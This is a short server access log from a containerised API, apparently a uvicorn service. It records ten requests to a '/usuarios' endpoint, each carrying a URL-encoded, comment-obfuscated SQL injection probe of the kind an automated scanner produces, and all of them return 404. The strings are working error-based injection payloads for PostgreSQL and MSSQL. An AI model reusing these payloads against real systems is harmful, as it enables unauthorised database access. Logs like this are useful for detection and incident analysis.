api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:60180 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/5611%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285611%3D5611%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%281826%3D1826 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60196 - "GET /usuarios/%2A%2A/AND/%2A%2A/5611%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285611%3D5611%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60208 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/5611%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285611%3D5611%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%28%27ZIbA%27%3D%27ZIbA HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60216 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/5611%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285611%3D5611%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%27vDdG%27%3D%27vDdG HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60224 - "GET /usuarios/%2A%2A/AND/%2A%2A/5611%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285611%3D5611%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29--/%2A%2A/lPPP HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60226 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/1832/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281832%3D1832%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%287605%3D7605 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60240 - "GET /usuarios/%2A%2A/AND/%2A%2A/1832/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281832%3D1832%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60250 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/1832/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281832%3D1832%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%28%27Zuky%27%3D%27Zuky HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60266 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/1832/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281832%3D1832%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%27uPSe%27%3D%27uPSe HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60270 - "GET /usuarios/%2A%2A/AND/%2A%2A/1832/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281832%3D1832%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29--/%2A%2A/oEXt HTTP/1.1" 404 Not Found
